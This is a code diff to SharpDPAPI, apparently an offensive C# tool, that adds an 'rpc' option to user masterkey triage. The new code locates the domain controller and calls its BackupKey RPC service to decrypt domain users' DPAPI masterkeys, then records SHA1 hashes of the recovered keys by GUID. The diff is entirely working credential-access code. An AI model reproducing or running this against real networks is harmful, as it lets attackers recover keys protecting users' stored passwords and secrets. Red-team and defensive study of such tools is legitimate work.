@@ -1,7 +1,10 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.DirectoryServices.ActiveDirectory;
 using System.IO;
+using System.Net;
 using System.Security.AccessControl;
+using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Xml;
@@ -11,7 +14,7 @@ namespace SharpDPAPI
     public class Triage
     {
         public static Dictionary<string, string> TriageUserMasterKeys(byte[] backupKeyBytes, bool show = false, string computerName = "", 
-            string password = "", string target = "", string userSID = "", bool dumpHash = false)
+            string password = "", string target = "", string userSID = "", bool dumpHash = false, bool rpc = false)
         {
             // triage all *user* masterkeys we can find, decrypting if the backupkey is supplied
             
@@ -197,6 +200,21 @@ namespace SharpDPAPI
                                 {
                                     userSID = !String.IsNullOrEmpty(userSID) ? userSID : Dpapi.ExtractSidFromPath(file);
                                     plaintextMasterKey = Dpapi.FormatHash(masterKeyBytes, userSID, isDomain ? 3 : 1);
+                                }
+                                else if(rpc && isDomain)
+                                {
+                                    DirectoryContext mycontext = new DirectoryContext(DirectoryContextType.Domain, System.Environment.UserDomainName);
+                                    DomainController dc = DomainController.FindOne(mycontext);
+                                    IPAddress DCIPAdress = IPAddress.Parse(dc.IPAddress);
+
+                                    var bkrp = new Bkrp();
+                                    bkrp.Initialize(DCIPAdress.ToString(), System.Environment.UserDomainName);
+                                    var keyBytes = bkrp.BackuprKey(SharpDPAPI.Dpapi.GetDomainKey(masterKeyBytes));
+                                    var guid = $"{{{Encoding.Unicode.GetString(masterKeyBytes, 12, 72)}}}";
+                                    var sha1 = new SHA1Managed();
+                                    var masterKeySha1 = sha1.ComputeHash(keyBytes);
+                                    var masterKeySha1Hex = BitConverter.ToString(masterKeySha1).Replace("-", "");
+                                    mappings.Add(guid, masterKeySha1Hex);
                                 }
 
                                 if (!plaintextMasterKey.Equals(default(KeyValuePair<string, string>)))
